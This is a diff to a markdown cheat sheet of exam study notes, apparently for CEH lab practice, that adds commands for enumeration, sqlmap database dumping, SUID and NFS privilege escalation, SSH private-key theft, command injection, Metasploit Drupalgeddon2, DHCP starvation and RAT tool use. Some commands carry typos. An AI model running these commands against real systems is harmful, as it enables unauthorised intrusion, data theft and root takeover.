@@ -170,7 +170,7 @@ run
 <details>
 <summary>BillCipher</summary>
 
-* Use this tool to get passive info of many details of org
+* Use this tool to get passive info of many details of org also to find the version of server nginx
 ```console
 :~$sudo apt update && sudo apt install ruby python python-pip python3 python3-pip
 sudo apt install httrack whatweb
@@ -401,14 +401,15 @@ nbtstat -c
 net use
 >>shows active connection and shared folder
 ```
-
+```
+nmap --script=nbstat.nse -sV
 </details>
 
 <details>
 
 <summary>SNMP enumeration using tools</summary>
 
-* SnmpWalk]
+* SnmpWalk
 ```console
 :~$ snmpwalk -v1 -c public <Ip address>
 -v1>>version of snmp
@@ -419,6 +420,10 @@ net use
 snmpwalk -v2c -c public <ipaddress>
 -v2c>>version
 ```
+
+```
+snmp-check <ip>
+
 </details>
 
 <details>
@@ -490,6 +495,15 @@ ls -d [name server]
 
 
 >> this finds responsible email by set type=soa
+```
+</details>
+
+<details>DNS enumeration</details>
+
+<summary>DNS enumeration </details>
+
+```console
+:~$ dnsenum www.certifiedhacker.com
 ```
 </details>
 
@@ -570,7 +584,7 @@ scan > task > task wizard > target ip
 # System Hacking
 <details>
 
-<summary>Crack the password using responder</summary>
+<summary>Crack the password using responder NTLM</summary>
 
 * cmd to run responder
 ```console
@@ -1829,7 +1843,7 @@ and we have to move the file
 mv jdk1.8.0_202 /usr/bin/
 Now, we need to update the installed JDK path in the poc.py file.
 pluma poc.py 
-line 62, replace jdk1.8.0_20/bin/javac with /usr/bin/jdk1.8.0_202/bin/java.
+line 62, replace jdk1.8.0_20/bin/javac with /usr/bin/jdk1.8.0_202/bin/javac.
 line 87 and replace jdk1.8.0_20/bin/java with /usr/bin/jdk1.8.0_202/bin/java
 line 99 and replace jdk1.8.0_20/bin/java with /usr/bin/jdk1.8.0_202/bin/java.
 
@@ -2545,21 +2559,27 @@ Copy the file from Desktop and paste it into Local Disk (I:).
 :~$ nmap -p 389, 636, 88, 3268 ip/24
 ```
 </details>
+
 <details>
 
 <summary> message signing feature in smb </summary>
+
 ```console
 :~$ nmap --script smb2-security-mode -p 445 172.30.10.200
+```
 </details>
 
 <details>
+
 <summary>to filter login credential</summary>
 
 ```console
+
 :~$ http.request.method == "GET" && http.host == "example.com"
 
 ```
 </details>
+
 <details>
 <summary>docker</summary>
 
@@ -2570,10 +2590,12 @@ sudo systemctl start docker
 </details>
 <details>
 <summary>name server lookup</summary>
+
 ```console
 :~$ nslookup -type=ns domain_name
 ```
 </details>
+
 <details>
 <summary>cracking sqlservice</summary>
 
@@ -2604,13 +2626,16 @@ Users/Public/Downloads
 <details>
 
 <summary>to check intigrity hashes of file </summary>
+
 ```console
 :~$ md5sum <file name>
 ```
 </details>
+
 <details>
 
 <summary>crc value</summary>
+
 ```console
 :~$ crc32 <file>
 certutil -hashfile <file> md5
@@ -2670,8 +2695,13 @@ for pdg change to "binary"
 
 ```console
 :~$ nmap -p 5555 (ADB)
+also  use "adb-devices"
+adb-connect ip:port
+adb shell
+
 ```
 </details>
+
 <details>
 
 <summary>clickjacking vuln find </summary>
@@ -2679,10 +2709,11 @@ for pdg change to "binary"
 ```console
 :~$ nikto -h www.abcd.com
 ```
-
+```
 ghosteye
 BillCipher
 Whatweb
+```
 </details>
 <details>
 
@@ -2747,11 +2778,13 @@ in user music folder
 <details>
 
 <summary>To find meta author </summary>
+
 ```console
 :~$ can use whatweb 
 curl url | grep -i author
 ```
 </details>
+
 <details>
 
 <summary>for checking vulnerability and cve</summary>
@@ -2759,23 +2792,29 @@ curl url | grep -i author
 ```console
 :~$ openvas
 filter cve check old cve
+for severity
+scan>report
 ```
 </details>
 <details>
 
 <summary>to check missing policy in website</summary>
+
 ```console
 :~$ zaproxy (owaspzap)
 check for CSP ie Content Security Policy (csp)
 ```
 </details>
+
 <details>
 
 <summary>Nikto</summary>
+
 ```console
 :~$ nikto -h <site>
 ```
 </details>
+
 <details>
 
 <summary>sql injection</summary>
@@ -2811,6 +2850,7 @@ check for CSP ie Content Security Policy (csp)
 
 <details>
 <summary>PID for the logfile</summary>
+
 ```console
 :~$ download and install procmon and doble click on exe file to see parent PID (double)
 ```
@@ -2823,8 +2863,11 @@ check for CSP ie Content Security Policy (csp)
 ```console
 :~$ use cryptool > analysis > tools for analysis
 can also use DIE (detect it easy)
+sudo apt install ent 
+ent <file name>
 ```
 </details>
+
 <details>
 
 <summary>RPCAP remote packet capture feature</summary>
@@ -2855,7 +2898,719 @@ steghide extract -sf filename.jpg
 <details>
 
 <summary>smb security Message signing feature </summary>
+
 ```console
 :~$ nmap --script smb2-security-mode -p 445 <target-ip>
+```
+</details>
+
+<details>
+
+<summary>web vulnerability in html form</summary>
+
+```console
+:~$wapiti -u http://TARGET_IP -f html -o report.html
+```
+</details>
+<details>
+
+<summary>To downlaod pdf from ftp</summary>
+
+```console
+:~$ type "binary" in ftp console
+```
+</details>
+
+<details>
+
+<summary>to extract the encrypted file with the password </summary>
+
+```console
+:~$  snow -C -p "<password>" <filename>.txt
+
+in powershell
+```
+
+</details>
+
+<details>
+
+<summary> to search vulnerability in nmap </summary>
+
+```console
+:~$ nmap -T4 -Ss -p 139,445 - -script vuln <IP/24> 
+
+```
+</summary>
+
+<details>
+
+<summary> to find flags in website page id =</summary>
+
+```console
+:~$ http://www.cehorg.com/index.php?page_id=95  for id changes 
+
+right click on page and go to page source and seach for Flag or format given in q
+```
+</details>
+
+<details>
+
+<summary>to perform sql injection without login </summary>
+
+```console
+:~$ sqlmap -u "http://192.168.44.40" --crawl=3 --level=5 --risk=3 -D database_name - 
+T table_name -C Flag --dump 
+```
+</summary>
+
+<details>
+
+<summary>do these step first then go with tool for privilage escalation</summary>
+
+```console
+:~$ First try:
+
+sudo -l
+
+Then:
+
+find / -perm -4000 -type f 2>/dev/null
+
+Then check:
+
+ls -l /etc/passwd
+
+Only if stuck → use LinPEAS.
+```
+</details>
+<details>
+
+<summary>use for vertical privilage </summary>
+
+```console
+:~$for vertical sudo -i
+
+Horizontal privilage escalation
+
+sudo -l for check the user 
+if not
+sudo -u user2 /bin/bash (which will be seen in sudo -l)
+again for root access get in user2
+by > sudo -u user2 /bin/bash (by ssh key)
+cd root
+ls
+cd .ssh for keys
+ls
+id_rsa for private key
+copy it to one file
+nono id_rsa
+chmod 600 id_rsa 
+then ssh @ip of victim -p 50706 -i id_rsa 
+
+if if not escalate to root and are in user copy local system key and try
+
+
+
+search for any valuabe file commads use
+GTFOBins and type find and select
+
+
+and
+
+sudo /bin/sh for interesting files
+
+check for instant root
+type in ssh user
+sudo . -exec /bin/sh \; -quit
+```
+</details>
+
+<details>
+
+<summary>vertical privalage advanced</summary>
+
+```console
+:~$ given a path or file
+ls -l
+to check permission like 755 500 (user permission)
+stat -c "%a %A %U %G %F" check for both the file and check for permission 4755
+2 for setgid 
+4 for setuid
+srtings <file name> and lookfor any familiar name
+and then
+cp /bin/bash <got file in top step>
+ls
+if two dlt one
+./welcome
+cd /root
+ls
+
+use this for wrong permission
+```
+
+<details>
+
+<summary>to find exact file in cmd </summary>
+
+```console
+:~$ find . -name root.txt
+
+```
+</details>
+
+<details>
+
+<summary> filter for more and less packets in wireshark </summary>
+
+```console
+:~$in statistics ipv4 
+
+ tcp.flags.syn == 1 and tcp.flags.ack == 0
+
+ ip.dst == 172.22.10.10 for destination mentioned
+
+
+```
+
+</details>
+
+<details>
+
+<summary> To check co-ordinate of geo location for Website </summary>
+
+```console
+:~$ nslookup www.example.com
+get ip
+
+ curl ipinfo.io <ip>
+
+ ```
+ </details>
+
+ <details>
+
+ <summary>To find FQDN </summary>
+
+ ```console
+ :~$ nmap -p 389 -T4 -A -v --script ldap-rootdse ip/24 
+ ```
+ </details>
+
+ <details>
+
+ <summary> to decrypt the hash passwords </summary>
+
+ ```console
+ :~$ to check the hash use hashid 
+ john --format=Raw-MD5 --wordlist=rockyou.txt Hash2crack.txt
+ ```
+</details>
+
+<details>
+
+<summary> To find the value in the Flag column in one of the DB tables SQL enjection</summary>
+
+```console
+:~$ sqlmap -u "http://192.168.44.40" --crawl=3 --level=5 --risk=3 --dbs
+```
+```
+sqlmap -u "http://192.168.44.40" --crawl=3 --level=5 --risk=3 -D database_name - -tables 
+```
+```
+sqlmap -u "http://192.168.44.40" --crawl=3 --level=5 --risk=3 -D database_name - 
+T table_name --columns 
+```
+```
+sqlmap -u "http://192.168.44.40" --crawl=3 --level=5 --risk=3 -D database_name - 
+T table_name -C Flag --dump
+```
+</details>
+<details>
+
+<summary>if vuln about drupal</summary>
+
+```console
+:~$metasploit
+ use exploit/unix/webapp/drupal_drupalgeddon2 
+```
+</details>
+
+<details>
+
+<summary>If RAT is enabled in clint </summary>
+
+```console
+:~$ use Theif RAT application
+```
+</details>
+
+<details>
+
+<summary>To extract the hidden credential of a file (encryption) stegnography</summary>
+
+```console
+:~$ download by apt
+stegsnow -p password -C restricted.txt output.txt 
+```
+</details>
+
+<details>
+
+<summary>to find mercury services </summary>
+
+```console
+:~$ scan this port on nmap
+25,80,110,143
+```
+</details>
+
+<details>
+
+<summary>to get file from searchsploit</summary>
+
+```console
+:~$ searchsploit -m 34992.py
+to run
+python3 file.py http://target
+```
+</details>
+
+<details>
+
+<summary>for any SQL doubt</summary>
+
+```console
+:~$ sudo apt update
+sudo apt install jsql-injection
+run by jsql for parameter injection
+```
+</details>
+
+<details>
+
+<summary>to check all the port in nmap</summary>
+
+```console
+:~$ use -p- for checking unknown port for RAT
+to search file in theif rat dir /b/s “sa_code*”
+```
+</details>
+
+<details>
+
+<summary> To find the file version of a malware sample </summary>
+
+```console
+:~$ exiftool
+```
+</details>
+
+<details>
+
+<summary> To see the hidden message, use the following command stegnography</summary>
+
+```console
+:~$ SNOW.EXE -C -p "magic" test2.txt 
+```
+</details>
+
+<details>
+
+<summary>To find FQDN </summary>
+
+```console
+:~$ look for DNS_Computer_name in nmap scan
+```
+</details>
+
+<details>
+
+<summary> to find LDAP account associated with domain </summary>
+
+```console
+:~$ nmap --script=*user* <ip> for ldap users enum
+```
+</details>
+
+<details>
+
+<summary>To find LDAP version</summary>
+
+```console
+:~$ ldapsearch -x -H ldap://<ip> (also gives product version)
+ldapsearch -x -H ldap://<IP> -b “DC=CEH,DC=com”
+ldapsearch -x -H ldap://10.10.10.25 -s base namingcontexts >to find baseDN
+ldapsearch -x -H ldap://10.10.10.25 -b "DC=CEHORG,DC=com" "objectclass=user" cn 
+```
+</details>
+
+<details>
+
+<summary>to bruteforce NTLM hash </summary>
+
+```console
+:~$ john /document/hash.txt --format=NT --wordlist /desktop/wordlist/password.txt
+```
+</details>
+
+<details>
+
+<summary>To find data from malware filename.exe</summary>
+
+```console
+:~$ use BinText
+
+malware face.exe to find data inside any exe file
+```
+</details>
+
+<details>
+
+<summary> to analyse elf <summary>
+
+```console
+:~$ file <file name>
+```
+</details>
+
+<details>
+
+<summary> windows service monitoring and finding service type </summary>
+
+```console
+:~$ Get-Service -Name afunix | Format-List *
+or
+(Get-Service-Name "afunix").ServiceType
+
+```
+</details>
+
+<details>
+
+<summary>To perform DHCP starvation attack</summary>
+
+```console
+:~$ yersinia -G 
+luanch attack > DHCP > sending discover packet > ok
+tcpdump -i eth0 -v (for monitor dump)
+use wireshark and search for transaction id
+```
+
+</details>
+
+<details>
+
+<summary>To find the protocol used for sniffing</summary>
+
+```console
+:~ filter for ARP in wireshark
+```
+</details>
+
+<details>
+
+<summary> To find Etag </summary>
+
+```console
+
+:~$ use telnet <ip> port
+
+GET / HTTP/1.0
+
+can also use nc --vv ip n port
+
+```
+
+</details>
+
+<details>
+
+<summary> To find Content management for website </summary>
+
+```console
+:~$ wig <example.com>
+whatweb <example.com>
+waplizer extension
+nmap --script=http-enum www.example.com
+```
+</details>
+
+<details>
+
+<summary>To perform web crawling and finding png file in image folder </summary>
+
+```console
+:~$ curl http://example.com | grep .png |wc -l
+```
+</details>
+
+<details>
+
+<summary> To find load balancer on a target server </summary>
+
+```console
+:~$ whatweb example.com 
+lbd example.com
+
+```
+</details>
+
+<details>
+
+<summary> to find number of users in machine </summary>
+
+```console
+:~$ use DVWA cmd injection (security level low)
+type
+<ip> && net user
+
+<ip> && dir C:\path .......use type for content view
+```
+</details>
+
+<details>
+
+<summary> For any hash decryption </summary>
+
+```console
+:~$ https://crackstation.net
+```
+</details>
+
+<details>
+
+<summary> To check weather the application using permission to read-call-logs </details>
+
+```console
+:~$ https://sisik.eu/apk-tool
+```
+</details>
+
+<summary>To decode the encoded file </summary>
+
+```console
+:~$ use BCTextencoder
+
+```
+</details>
+
+<details>
+
+<summary>Advance encryption standard (AES) </summary>
+
+```
+:~$ use AES-Tool
+```
+
+</details>
+
+<details>
+
+<summary> sql injection to find flag in database without coookie</summary>
+
+```console
+:~$ To perform SQL injection attack on a web application, cybersec.cehorg.com, available at 
+192.168.44.40. Find the value in the Flag column in one of the DB tables and enter it as the 
+answer.
+
+
+ Open mate terminal and type sudo su
+2. Type  wapiti -u <url> -m sql  This Will give the vulnerable parameter
+3. Type  sqlmap -u <Vulnerable url> --dbs  
+4. sqlmap -u <Vulnerable url> -D <database name> --tables  
+5. Type  sqlmap -u <Vulnerable url> -D <database name> -T <table name> --columns  
+This Will list the information aboult the columns in the selected table
+6. Type  sqlmap -u <Vulnerable url> -D <database name> -T <table name> -C <columna 
+name> --dump   This Will Display/dump the data from the columns
+7. Give the flag as answe
+```
+</details>
+
+<details>
+
+<summary>SQL injection without login </summary>
+
+```console
+:~$ 1. nmap -sV --script=http-enum [target domain or IP address]  
+2. Find any input parameter on website and capture the request in burp and then 
+use it to perform sql injection using sqlmap.  
+3. Now open the burp and check the input parameters and intercept on then type 
+some as “1 OR ANY TEXT” you get some value on burp copy that and create the txt 
+f
+ile. (1 OR 1=1 #)  
+4. sqlmap -r <txt file from burpsuite> --dbs  
+5. sqlmap -r <txt file from burpsuite> -D <database name> --tables  
+6. sqlmap -r <txt file from burpsuite> -D <database name> -T <table name> -
+columns  
+7. sqlmap -r <txt file from burpsuite> -D <database name> -T <table name> --dump
+all  
+8. then login and do the url parameter change page_id=1 to page_id=84 
+```
+</details>
+
+<details>
+
+<summary> To find lowest severity report</summary>
+
+```console
+:~$ nmap --script vuln <ip>
+
+```
+</details>
+
+<details>
+
+<summary>NSE script nmap script</summary>
+
+```console
+:~$ https://nmap.org/nsedoc/
+
+```
+</details>
+
+<details>
+
+<summary>smb enumeration </summary>
+
+```console
+nmap -p 445 --script smb-enum-shares 10.10.19.1
+```
+```
+to enumerate specific user 
+```
+```
+nmap -p 445 --script smb-enum-users --script-args smbusername=<administrator>,smbpassword=<password> ip
+
+```
+for groups
+```
+nmap -p 445 --script smb-enum-groups --script-args smbusername=<administrator>,smbpassword=<password> ip
+```
+for services
+```
+nmap -p 445 --script smb-enum-srvices --script-args smbusername=<administrator>,smbpassword=<password> ip
+
+```
+</details>
+
+<details>
+
+<summary>to check hash "website" </summary>
+
+```console
+:~$ hashes.com
+```
+</details>
+
+<details>
+
+<summary> To decrypt hexadecimal character </summary>
+
+
+```console
+:~$ echo 70617373776f7264 | xxd -r -p
+
+```
+```
+also can use cybercheff
+```
+
+</details>
+
+<details>
+<summary>Tools for escalate privalage  (gives full details "enum")</summary>
+
+```console
+:~$ 1. rebootuser / LinEnum
+    2. Peass-ng / linPEAS
+
+
+  use for permission check read and write setuid setgid
+```
+</details>
+
+<details>
+
+<summary>RAT tools to connect to RAT server </summary>
+
+```console
+:~$ njRAT
+    MoSucker
+    ProRat
+    Theef
+    HTTP RAT
+    check evry tool to auto connect password
+    the server RAT should compatible with host tool
+```
+</details>
+
+<details>
+
+<summary>NFS privilage escalation if enabled in target </summary>
+
+```console
+:~$ Note: use "LinuxPass" when asked for machine password in nfs
+
+nmap -sV <IP addr>
+sudo apt-get install nfs-common
+showmount -e <IP addr>
+
+mkdir /tmp/nfs
+
+sudo mount -t nfs <IP addr>:/home /tmp/nfs
+
+cd /tmp/nfs
+
+sudo cp /bin/bash
+
+sudo chmod +s bash
+
+ls -la bash
+
+ssh -l ubuntu <IP addr>
+
+cd /home
+
+./bash -p
+
+id
+
+```
+</details>
+
+<details>
+
+<summary>To check ELF file CPU Architecture it was built for</summary>
+
+```console
+:~$ Use Ghydra tool and drag and drop it to the ghidra tool look (X86,32)
+```
+</details>
+
+<details>
+
+<summary>for password audit for server present in domain </summary>
+
+```console
+:~$ use lophtcrack7
+```
+</details>
+
+<details>
+
+<summary>To find packet ID in wireshark </summary>
+
+```console
+:~$ Internet control message protocol>expand internet protocol version4>look for identification
+```
+</details>
+
+<details>
+
+<summary>To Perform windows service monitoring and find out the service type associated with display name "afunix"</summary>
+
+```console
+:~$ use service manager in windows 
 ```
 </details>
